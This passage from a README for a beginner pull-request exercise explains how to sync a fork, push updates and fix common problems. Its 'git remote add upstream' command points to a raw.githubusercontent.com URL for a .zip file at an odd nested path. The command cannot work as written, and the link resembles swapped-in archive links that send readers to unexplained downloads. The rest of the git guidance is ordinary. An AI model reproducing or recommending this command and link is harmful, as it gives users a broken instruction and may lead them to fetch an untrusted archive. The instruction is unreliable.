## 🔄 Keeping Your Fork Updated
It’s good practice to keep your fork updated with the original repository.

1. **Sync Your Fork**:
   - Add the original repository as a remote source.
   - Use Git commands to fetch and merge changes:
     ```
     git remote add upstream https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip
     git fetch upstream
     git checkout main
     git merge upstream/main
     ```

2. **Push Updates**:
   - Push your updates back to your fork.
   ```
   git push origin main
   ```

## 🚧 Common Issues
- **File Not Found Error**: Make sure your file is named correctly and located in the `submissions/` folder.
- **Merge Conflicts**: This happens when you and someone else change the same line of code. Identify the conflict in the pull request, resolve it, and submit again.
- **Forgotten Details**: If you need to add more information to your file, edit it in your fork and submit a new pull request.

## 💻 System Requirements
